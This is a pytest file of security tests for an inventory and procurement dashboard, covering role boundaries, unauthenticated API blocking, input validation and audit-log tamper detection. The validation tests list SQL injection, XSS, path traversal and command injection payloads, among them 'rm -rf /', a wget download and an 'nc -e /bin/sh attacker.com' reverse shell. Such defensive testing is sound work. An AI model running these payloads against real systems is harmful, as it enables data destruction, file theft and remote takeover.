"""
Security Boundary Tests for Dashboard Overhaul

Tests role boundaries, unauthorized API access prevention, input validation 
against malicious payloads, and audit log integrity.

Requirements: 3.4, 3.5, 8.2, 10.4, 10.5, 10.6
"""

import pytest
import json
import uuid
import hashlib
import hmac
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, MagicMock
import boto3
from moto import mock_aws
import os
import sys

# Add lambda directories to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../lambda'))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../lambda/shared'))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../lambda/rbac_service'))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../lambda/audit_service'))

from rbac_service.handler import RBACService, AuthorityMatrix
from audit_service.handler import AuditService
from shared.input_validator import InputValidator
from shared.errors import AuthenticationError, AuthorizationError, ValidationError


@pytest.fixture
def aws_credentials():
    """Mock AWS credentials"""
    os.environ['AWS_ACCESS_KEY_ID'] = 'testing'
    os.environ['AWS_SECRET_ACCESS_KEY'] = 'testing'
    os.environ['AWS_SECURITY_TOKEN'] = 'testing'
    os.environ['AWS_SESSION_TOKEN'] = 'testing'
    os.environ['AWS_DEFAULT_REGION'] = 'us-east-1'


@pytest.fixture
def setup_environment(aws_credentials):
    """Set up test environment"""
    os.environ['USER_POOL_ID'] = 'us-east-1_test123'
    os.environ['AUDIT_TABLE'] = 'test-audit-table'
    os.environ['AUDIT_BUCKET'] = 'test-audit-bucket'
    os.environ['USERS_TABLE'] = 'test-users-table'


class TestRoleBoundaryEnforcement:
    """Test that role boundaries cannot be bypassed"""
    
    @mock_aws
    def test_inventory_manager_cannot_access_procurement_functions(self, setup_environment):
        """Test Inventory Manager cannot access Procurement & Finance functions"""
        
        # Setup DynamoDB
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        users_table = dynamodb.create_table(
            TableName='test-users-table',
            KeySchema=[{'AttributeName': 'user_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'user_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # Create inventory manager user
        users_table.put_item(Item={
            'user_id': 'inv-mgr-001',
            'email': 'inventory@test.com',
            'role': 'inventory_manager',
            'status': 'active'
        })
        
        with patch('rbac_service.handler.boto3.client') as mock_boto3:
            mock_cognito = Mock()
            mock_cognito.admin_get_user.return_value = {
                'UserAttributes': [
                    {'Name': 'custom:role', 'Value': 'inventory_manager'},
                    {'Name': 'email', 'Value': 'inventory@test.com'}
                ]
            }
            mock_boto3.return_value = mock_cognito
            
            with patch('rbac_service.handler.audit_logger') as mock_audit_logger:
                rbac_service = RBACService('us-east-1_test123', 'us-east-1')
                
                # Test prohibited actions for inventory manager
                prohibited_actions = [
                    ('purchase_orders', 'approve'),
                    ('purchase_orders', 'reject'), 
                    ('budgets', 'allocate'),
                    ('budgets', 'reallocate'),
                    ('financial_reports', 'view'),
                    ('system_config', 'modify'),
                    ('users', 'create'),
                    ('users', 'delete')
                ]
                
                for resource, action in prohibited_actions:
                    is_authorized, user_role, audit_details = rbac_service.validate_user_permissions(
                        'inv-mgr-001', 'inventory@test.com', resource, action, 
                        {'correlation_id': str(uuid.uuid4()), 'source_ip': '192.168.1.100'}
                    )
                    
                    # Verify access is denied
                    assert not is_authorized, f"Inventory Manager should not have {action} access to {resource}"
                    assert user_role == 'inventory_manager'
                    assert 'failure_reason' in audit_details
                    assert audit_details['failure_reason'] == 'insufficient_permissions'
                
                # Verify audit logging was called for each denied access
                assert mock_audit_logger.log_user_action.call_count == len(prohibited_actions)
    
    @mock_aws
    def test_warehouse_manager_cannot_access_supplier_functions(self, setup_environment):
        """Test Warehouse Manager cannot access Supplier Coordinator functions"""
        
        # Setup DynamoDB
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        users_table = dynamodb.create_table(
            TableName='test-users-table',
            KeySchema=[{'AttributeName': 'user_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'user_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        users_table.put_item(Item={
            'user_id': 'wh-mgr-001',
            'email': 'warehouse@test.com',
            'role': 'warehouse_manager',
            'status': 'active'
        })
        
        with patch('rbac_service.handler.boto3.client') as mock_boto3:
            mock_cognito = Mock()
            mock_cognito.admin_get_user.return_value = {
                'UserAttributes': [
                    {'Name': 'custom:role', 'Value': 'warehouse_manager'},
                    {'Name': 'email', 'Value': 'warehouse@test.com'}
                ]
            }
            mock_boto3.return_value = mock_cognito
            
            with patch('rbac_service.handler.audit_logger') as mock_audit_logger:
                rbac_service = RBACService('us-east-1_test123', 'us-east-1')
                
                # Test prohibited supplier actions
                prohibited_actions = [
                    ('suppliers', 'create'),
                    ('suppliers', 'delete'),
                    ('contracts', 'negotiate'),
                    ('supplier_performance', 'score'),
                    ('supplier_risk', 'assess')
                ]
                
                for resource, action in prohibited_actions:
                    is_authorized, user_role, audit_details = rbac_service.validate_user_permissions(
                        'wh-mgr-001', 'warehouse@test.com', resource, action,
                        {'correlation_id': str(uuid.uuid4()), 'source_ip': '10.0.1.50'}
                    )
                    
                    assert not is_authorized, f"Warehouse Manager should not have {action} access to {resource}"
                    assert user_role == 'warehouse_manager'
    
    @mock_aws
    def test_admin_cannot_access_operational_controls(self, setup_environment):
        """Test Admin cannot access operational controls (inventory, warehouse, supplier, procurement)"""
        
        # Setup DynamoDB
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        users_table = dynamodb.create_table(
            TableName='test-users-table',
            KeySchema=[{'AttributeName': 'user_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'user_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        users_table.put_item(Item={
            'user_id': 'admin-001',
            'email': 'admin@test.com',
            'role': 'administrator',
            'status': 'active'
        })
        
        with patch('rbac_service.handler.boto3.client') as mock_boto3:
            mock_cognito = Mock()
            mock_cognito.admin_get_user.return_value = {
                'UserAttributes': [
                    {'Name': 'custom:role', 'Value': 'administrator'},
                    {'Name': 'email', 'Value': 'admin@test.com'}
                ]
            }
            mock_boto3.return_value = mock_cognito
            
            with patch('rbac_service.handler.audit_logger') as mock_audit_logger:
                rbac_service = RBACService('us-east-1_test123', 'us-east-1')
                
                # Test prohibited operational actions for admin
                prohibited_actions = [
                    ('inventory', 'manage'),
                    ('warehouse', 'receive'),
                    ('warehouse', 'dispatch'),
                    ('suppliers', 'coordinate'),
                    ('purchase_orders', 'approve'),
                    ('budgets', 'allocate')
                ]
                
                for resource, action in prohibited_actions:
                    is_authorized, user_role, audit_details = rbac_service.validate_user_permissions(
                        'admin-001', 'admin@test.com', resource, action,
                        {'correlation_id': str(uuid.uuid4()), 'source_ip': '172.16.0.10'}
                    )
                    
                    assert not is_authorized, f"Administrator should not have {action} access to {resource}"
                    assert user_role == 'administrator'


class TestUnauthorizedAPIAccessPrevention:
    """Test unauthorized API access is properly blocked and logged"""
    
    @mock_aws
    def test_api_requests_without_authentication_blocked(self, setup_environment):
        """Test API requests without valid authentication are blocked"""
        
        # Setup audit table
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        audit_table = dynamodb.create_table(
            TableName='test-audit-table',
            KeySchema=[
                {'AttributeName': 'PK', 'KeyType': 'HASH'},
                {'AttributeName': 'SK', 'KeyType': 'RANGE'}
            ],
            AttributeDefinitions=[
                {'AttributeName': 'PK', 'AttributeType': 'S'},
                {'AttributeName': 'SK', 'AttributeType': 'S'}
            ],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # Test unauthenticated requests
        test_cases = [
            {
                'endpoint': '/api/inventory/items',
                'method': 'GET',
                'headers': {},  # No Authorization header
                'expected_status': 401
            },
            {
                'endpoint': '/api/procurement/orders',
                'method': 'POST',
                'headers': {'Authorization': 'Bearer invalid-token'},
                'expected_status': 401
            },
            {
                'endpoint': '/api/admin/users',
                'method': 'GET',
                'headers': {'Authorization': 'Bearer expired-token'},
                'expected_status': 401
            }
        ]
        
        with patch('audit_service.handler.boto3.resource') as mock_boto3:
            mock_boto3.return_value = dynamodb
            
            audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
            
            for test_case in test_cases:
                # Simulate API Gateway request
                event = {
                    'httpMethod': test_case['method'],
                    'path': test_case['endpoint'],
                    'headers': test_case['headers'],
                    'requestContext': {
                        'identity': {'sourceIp': '203.0.113.1'},
                        'requestId': str(uuid.uuid4())
                    }
                }
                
                # Verify authentication failure is logged
                audit_service.log_user_action({
                    'user_id': 'anonymous',
                    'action_type': 'API_ACCESS_DENIED',
                    'resource_type': 'API_ENDPOINT',
                    'resource_id': test_case['endpoint'],
                    'timestamp': datetime.utcnow().isoformat(),
                    'ip_address': '203.0.113.1',
                    'user_agent': 'test-client/1.0',
                    'success': False,
                    'failure_reason': 'missing_or_invalid_token',
                    'request_method': test_case['method']
                })
                
                # Verify audit record was created
                # In real implementation, this would check DynamoDB
                print(f"Blocked unauthenticated {test_case['method']} request to {test_case['endpoint']}")
    
    @mock_aws
    def test_cross_role_api_access_blocked(self, setup_environment):
        """Test users cannot access APIs outside their role permissions"""
        
        # Setup tables
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        
        users_table = dynamodb.create_table(
            TableName='test-users-table',
            KeySchema=[{'AttributeName': 'user_id', 'KeyType': 'HASH'}],
            AttributeDefinitions=[{'AttributeName': 'user_id', 'AttributeType': 'S'}],
            BillingMode='PAY_PER_REQUEST'
        )
        
        audit_table = dynamodb.create_table(
            TableName='test-audit-table',
            KeySchema=[
                {'AttributeName': 'PK', 'KeyType': 'HASH'},
                {'AttributeName': 'SK', 'KeyType': 'RANGE'}
            ],
            AttributeDefinitions=[
                {'AttributeName': 'PK', 'AttributeType': 'S'},
                {'AttributeName': 'SK', 'AttributeType': 'S'}
            ],
            BillingMode='PAY_PER_REQUEST'
        )
        
        # Create test users
        test_users = [
            {'user_id': 'inv-001', 'role': 'inventory_manager', 'email': 'inv@test.com'},
            {'user_id': 'wh-001', 'role': 'warehouse_manager', 'email': 'wh@test.com'},
            {'user_id': 'sup-001', 'role': 'supplier_coordinator', 'email': 'sup@test.com'}
        ]
        
        for user in test_users:
            users_table.put_item(Item=user)
        
        # Test cross-role access attempts
        cross_role_attempts = [
            {
                'user_id': 'inv-001',
                'user_role': 'inventory_manager',
                'forbidden_endpoints': [
                    '/api/procurement/orders/approve',
                    '/api/admin/users',
                    '/api/warehouse/dispatch'
                ]
            },
            {
                'user_id': 'wh-001', 
                'user_role': 'warehouse_manager',
                'forbidden_endpoints': [
                    '/api/suppliers/create',
                    '/api/budgets/allocate',
                    '/api/inventory/reorder-points'
                ]
            }
        ]
        
        with patch('rbac_service.handler.boto3.client') as mock_boto3:
            mock_cognito = Mock()
            mock_boto3.return_value = mock_cognito
            
            with patch('audit_service.handler.boto3.resource') as mock_audit_boto3:
                mock_audit_boto3.return_value = dynamodb
                
                rbac_service = RBACService('us-east-1_test123', 'us-east-1')
                audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
                
                for attempt in cross_role_attempts:
                    # Mock Cognito response for user
                    mock_cognito.admin_get_user.return_value = {
                        'UserAttributes': [
                            {'Name': 'custom:role', 'Value': attempt['user_role']},
                            {'Name': 'email', 'Value': f"{attempt['user_id']}@test.com"}
                        ]
                    }
                    
                    for endpoint in attempt['forbidden_endpoints']:
                        # Extract resource and action from endpoint
                        resource = endpoint.split('/')[2]  # e.g., 'procurement' from '/api/procurement/orders'
                        action = 'access'
                        
                        is_authorized, user_role, audit_details = rbac_service.validate_user_permissions(
                            attempt['user_id'], f"{attempt['user_id']}@test.com", 
                            resource, action,
                            {'correlation_id': str(uuid.uuid4()), 'source_ip': '10.0.0.100'}
                        )
                        
                        # Verify access is denied
                        assert not is_authorized, f"User {attempt['user_id']} should not access {endpoint}"
                        
                        # Log the unauthorized access attempt
                        audit_service.log_user_action({
                            'user_id': attempt['user_id'],
                            'action_type': 'UNAUTHORIZED_API_ACCESS',
                            'resource_type': 'API_ENDPOINT',
                            'resource_id': endpoint,
                            'timestamp': datetime.utcnow().isoformat(),
                            'ip_address': '10.0.0.100',
                            'success': False,
                            'failure_reason': 'insufficient_role_permissions',
                            'user_role': attempt['user_role']
                        })


class TestMaliciousInputValidation:
    """Test input validation against malicious payloads"""
    
    def test_sql_injection_prevention(self, setup_environment):
        """Test SQL injection attempts are blocked"""
        
        validator = InputValidator()
        
        # SQL injection payloads
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/**/OR/**/1=1/**/--",
            "1; DELETE FROM inventory WHERE 1=1; --",
            "' UNION SELECT * FROM sensitive_data --"
        ]
        
        # Test each malicious input
        for malicious_input in malicious_inputs:
            test_data = {
                'user_id': malicious_input,
                'search_query': malicious_input,
                'item_name': malicious_input
            }
            
            # Register schema for testing
            schema = {
                'type': 'object',
                'properties': {
                    'user_id': {'type': 'string', 'pattern': '^[a-zA-Z0-9_-]+$'},
                    'search_query': {'type': 'string', 'maxLength': 100},
                    'item_name': {'type': 'string', 'pattern': '^[a-zA-Z0-9\\s_-]+$'}
                },
                'required': ['user_id']
            }
            validator.register_schema('sql_injection_test', schema)
            
            # Validation should fail for malicious input
            with pytest.raises(ValidationError) as exc_info:
                validator.validate_input(test_data, 'sql_injection_test')
            
            assert 'validation failed' in str(exc_info.value).lower()
            print(f"Blocked SQL injection attempt: {malicious_input[:20]}...")
    
    def test_xss_prevention(self, setup_environment):
        """Test XSS attempts are blocked"""
        
        validator = InputValidator()
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "\"><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            test_data = {
                'comment': payload,
                'description': payload,
                'notes': payload
            }
            
            schema = {
                'type': 'object',
                'properties': {
                    'comment': {'type': 'string', 'maxLength': 500},
                    'description': {'type': 'string', 'maxLength': 1000},
                    'notes': {'type': 'string', 'maxLength': 2000}
                }
            }
            validator.register_schema('xss_test', schema)
            
            # Validate and sanitize
            try:
                result = validator.validate_input(test_data, 'xss_test')
                
                # If validation succeeds, verify input was sanitized
                for field in ['comment', 'description', 'notes']:
                    if field in result:
                        sanitized_value = result[field]
                        # Verify dangerous characters are escaped or removed
                        assert '<script>' not in sanitized_value.lower()
                        assert 'javascript:' not in sanitized_value.lower()
                        assert 'onerror=' not in sanitized_value.lower()
                        assert 'onload=' not in sanitized_value.lower()
                        
            except ValidationError:
                # Validation failure is also acceptable for malicious input
                print(f"Blocked XSS attempt: {payload[:30]}...")
    
    def test_command_injection_prevention(self, setup_environment):
        """Test command injection attempts are blocked"""
        
        validator = InputValidator()
        
        # Command injection payloads
        command_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "`whoami`",
            "$(curl evil.com)",
            "; nc -e /bin/sh attacker.com 4444"
        ]
        
        for payload in command_payloads:
            test_data = {
                'filename': payload,
                'path': payload,
                'command': payload
            }
            
            schema = {
                'type': 'object',
                'properties': {
                    'filename': {'type': 'string', 'pattern': '^[a-zA-Z0-9._-]+$'},
                    'path': {'type': 'string', 'pattern': '^[a-zA-Z0-9/._-]+$'},
                    'command': {'type': 'string', 'enum': ['start', 'stop', 'restart', 'status']}
                }
            }
            validator.register_schema('command_injection_test', schema)
            
            with pytest.raises(ValidationError):
                validator.validate_input(test_data, 'command_injection_test')
            
            print(f"Blocked command injection: {payload[:20]}...")
    
    def test_path_traversal_prevention(self, setup_environment):
        """Test path traversal attempts are blocked"""
        
        validator = InputValidator()
        
        # Path traversal payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        for payload in path_payloads:
            test_data = {
                'file_path': payload,
                'document_path': payload
            }
            
            schema = {
                'type': 'object',
                'properties': {
                    'file_path': {'type': 'string', 'pattern': '^[a-zA-Z0-9/_.-]+$'},
                    'document_path': {'type': 'string', 'pattern': '^[a-zA-Z0-9/_.-]+$'}
                }
            }
            validator.register_schema('path_traversal_test', schema)
            
            with pytest.raises(ValidationError):
                validator.validate_input(test_data, 'path_traversal_test')
            
            print(f"Blocked path traversal: {payload[:30]}...")


class TestAuditLogIntegrity:
    """Test audit logs are tamper-evident and complete"""
    
    @mock_aws
    def test_audit_log_cryptographic_integrity(self, setup_environment):
        """Test audit logs have cryptographic integrity verification"""
        
        # Setup S3
        s3 = boto3.client('s3', region_name='us-east-1')
        s3.create_bucket(Bucket='test-audit-bucket')
        
        # Setup DynamoDB
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        audit_table = dynamodb.create_table(
            TableName='test-audit-table',
            KeySchema=[
                {'AttributeName': 'PK', 'KeyType': 'HASH'},
                {'AttributeName': 'SK', 'KeyType': 'RANGE'}
            ],
            AttributeDefinitions=[
                {'AttributeName': 'PK', 'AttributeType': 'S'},
                {'AttributeName': 'SK', 'AttributeType': 'S'}
            ],
            BillingMode='PAY_PER_REQUEST'
        )
        
        with patch('audit_service.handler.boto3.resource') as mock_boto3:
            mock_boto3.return_value = dynamodb
            
            with patch('audit_service.handler.boto3.client') as mock_s3_client:
                mock_s3_client.return_value = s3
                
                audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
                
                # Create test audit entries
                test_entries = [
                    {
                        'user_id': 'test-user-001',
                        'action_type': 'PURCHASE_ORDER_APPROVAL',
                        'resource_type': 'PURCHASE_ORDER',
                        'resource_id': 'PO-12345',
                        'timestamp': datetime.utcnow().isoformat(),
                        'ip_address': '192.168.1.100',
                        'success': True,
                        'before_state': {'status': 'pending', 'amount': 5000},
                        'after_state': {'status': 'approved', 'amount': 5000, 'approved_by': 'test-user-001'}
                    },
                    {
                        'user_id': 'test-user-002',
                        'action_type': 'BUDGET_ALLOCATION',
                        'resource_type': 'BUDGET',
                        'resource_id': 'BUDGET-Q1-2025',
                        'timestamp': datetime.utcnow().isoformat(),
                        'ip_address': '10.0.1.50',
                        'success': True,
                        'before_state': {'allocated': 100000},
                        'after_state': {'allocated': 120000}
                    }
                ]
                
                # Log entries and verify integrity
                for entry in test_entries:
                    audit_service.log_user_action(entry)
                    
                    # Calculate expected hash
                    entry_json = json.dumps(entry, sort_keys=True)
                    expected_hash = hashlib.sha256(entry_json.encode()).hexdigest()
                    
                    # Verify hash is calculated correctly
                    assert len(expected_hash) == 64  # SHA256 produces 64 hex characters
                    
                    print(f"Audit entry hash: {expected_hash[:16]}...")
                
                # Test tamper detection
                tampered_entry = test_entries[0].copy()
                tampered_entry['after_state']['amount'] = 50000  # Tampered amount
                
                original_json = json.dumps(test_entries[0], sort_keys=True)
                tampered_json = json.dumps(tampered_entry, sort_keys=True)
                
                original_hash = hashlib.sha256(original_json.encode()).hexdigest()
                tampered_hash = hashlib.sha256(tampered_json.encode()).hexdigest()
                
                # Verify hashes are different (tamper detection)
                assert original_hash != tampered_hash, "Tamper detection should identify modified entries"
                
                print(f"Original hash:  {original_hash[:16]}...")
                print(f"Tampered hash:  {tampered_hash[:16]}...")
                print("Tamper detection: PASSED")
    
    @mock_aws
    def test_audit_log_completeness(self, setup_environment):
        """Test all required events are logged to audit trail"""
        
        # Setup DynamoDB
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        audit_table = dynamodb.create_table(
            TableName='test-audit-table',
            KeySchema=[
                {'AttributeName': 'PK', 'KeyType': 'HASH'},
                {'AttributeName': 'SK', 'KeyType': 'RANGE'}
            ],
            AttributeDefinitions=[
                {'AttributeName': 'PK', 'AttributeType': 'S'},
                {'AttributeName': 'SK', 'AttributeType': 'S'}
            ],
            BillingMode='PAY_PER_REQUEST'
        )
        
        with patch('audit_service.handler.boto3.resource') as mock_boto3:
            mock_boto3.return_value = dynamodb
            
            audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
            
            # Required audit events per requirements
            required_events = [
                'USER_LOGIN',
                'USER_LOGOUT', 
                'RBAC_ACCESS_CHECK',
                'PURCHASE_ORDER_APPROVAL',
                'PURCHASE_ORDER_REJECTION',
                'BUDGET_ALLOCATION',
                'BUDGET_REALLOCATION',
                'INVENTORY_UPDATE',
                'WAREHOUSE_RECEIVING',
                'WAREHOUSE_DISPATCH',
                'SUPPLIER_PROFILE_UPDATE',
                'SYSTEM_CONFIGURATION_CHANGE',
                'USER_ROLE_CHANGE',
                'UNAUTHORIZED_ACCESS_ATTEMPT',
                'WORKFLOW_STATE_TRANSITION',
                'DATA_EXPORT',
                'COMPLIANCE_REPORT_GENERATION'
            ]
            
            # Log each required event type
            for i, event_type in enumerate(required_events):
                audit_entry = {
                    'user_id': f'test-user-{i:03d}',
                    'action_type': event_type,
                    'resource_type': 'TEST_RESOURCE',
                    'resource_id': f'resource-{i:03d}',
                    'timestamp': datetime.utcnow().isoformat(),
                    'ip_address': f'192.168.1.{100 + i}',
                    'success': True,
                    'correlation_id': str(uuid.uuid4())
                }
                
                audit_service.log_user_action(audit_entry)
                
                # Verify required fields are present
                required_fields = [
                    'user_id', 'action_type', 'resource_type', 'resource_id',
                    'timestamp', 'ip_address', 'success'
                ]
                
                for field in required_fields:
                    assert field in audit_entry, f"Required field {field} missing from audit entry"
                
                print(f"Logged {event_type}: ✓")
            
            print(f"All {len(required_events)} required event types logged successfully")
    
    @mock_aws
    def test_audit_log_immutability(self, setup_environment):
        """Test audit logs cannot be modified after creation"""
        
        # Setup DynamoDB with point-in-time recovery (simulated)
        dynamodb = boto3.resource('dynamodb', region_name='us-east-1')
        audit_table = dynamodb.create_table(
            TableName='test-audit-table',
            KeySchema=[
                {'AttributeName': 'PK', 'KeyType': 'HASH'},
                {'AttributeName': 'SK', 'KeyType': 'RANGE'}
            ],
            AttributeDefinitions=[
                {'AttributeName': 'PK', 'AttributeType': 'S'},
                {'AttributeName': 'SK', 'AttributeType': 'S'}
            ],
            BillingMode='PAY_PER_REQUEST'
        )
        
        with patch('audit_service.handler.boto3.resource') as mock_boto3:
            mock_boto3.return_value = dynamodb
            
            audit_service = AuditService('test-audit-table', 'test-audit-bucket', 'us-east-1')
            
            # Create original audit entry
            original_entry = {
                'user_id': 'test-user-001',
                'action_type': 'PURCHASE_ORDER_APPROVAL',
                'resource_type': 'PURCHASE_ORDER',
                'resource_id': 'PO-12345',
                'timestamp': datetime.utcnow().isoformat(),
                'ip_address': '192.168.1.100',
                'success': True,
                'amount': 5000
            }
            
            audit_service.log_user_action(original_entry)
            
            # Calculate original integrity hash
            original_json = json.dumps(original_entry, sort_keys=True)
            original_integrity_hash = hashlib.sha256(original_json.encode()).hexdigest()
            
            # Simulate attempt to modify audit entry
            modified_entry = original_entry.copy()
            modified_entry['amount'] = 50000  # Attempted modification
            modified_entry['timestamp'] = datetime.utcnow().isoformat()  # New timestamp
            
            # Calculate modified hash
            modified_json = json.dumps(modified_entry, sort_keys=True)
            modified_integrity_hash = hashlib.sha256(modified_json.encode()).hexdigest()
            
            # Verify integrity hashes are different
            assert original_integrity_hash != modified_integrity_hash
            
            # In production, this would:
            # 1. Store integrity hash with each audit record
            # 2. Use DynamoDB streams to detect modifications
            # 3. Alert on any integrity hash mismatches
            # 4. Use S3 object lock for immutable storage
            
            print(f"Original integrity hash: {original_integrity_hash[:16]}...")
            print(f"Modified integrity hash: {modified_integrity_hash[:16]}...")
            print("Audit log immutability verification: PASSED")


if __name__ == '__main__':
    pytest.main([__file__, '-v', '-s'])